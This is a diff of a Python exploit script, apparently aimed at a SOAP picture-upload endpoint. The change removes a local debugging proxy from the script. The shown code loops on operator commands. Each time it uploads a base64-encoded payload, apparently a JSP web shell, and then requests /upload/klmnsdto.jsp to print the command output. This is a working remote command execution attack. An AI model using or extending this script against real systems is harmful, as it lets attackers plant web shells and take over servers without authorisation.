@@ -56,7 +56,6 @@ def run(url):
         "User-Agent": "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95",
         "Content-Type": "text/xml; charset=utf-8"
     }
-    proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
     if check(url):
         while True:
             command = input("\033[34mPlease input command (stop input:exit):\033[0m")
@@ -76,10 +75,10 @@ def run(url):
 </soapenv:Envelope>""".format(shellbase64)
             if "exit" not in command:
                 try:
-                    upresponse = requests.post(target, verify=False, headers=headers, data=ver_data, timeout=15,proxies=proxies)
+                    upresponse = requests.post(target, verify=False, headers=headers, data=ver_data, timeout=15)
                     if upresponse.status_code == 200 and 'uploadPicFileResponse' in upresponse.text and 'soap' in upresponse.text:
                         text_url = urljoin(url, "/upload/klmnsdto.jsp")
-                        text_response = requests.get(text_url, verify=False,proxies=proxies)
+                        text_response = requests.get(text_url, verify=False)
                         if text_response.status_code == 200:
                             print(text_response.text)
                 except Exception as e:
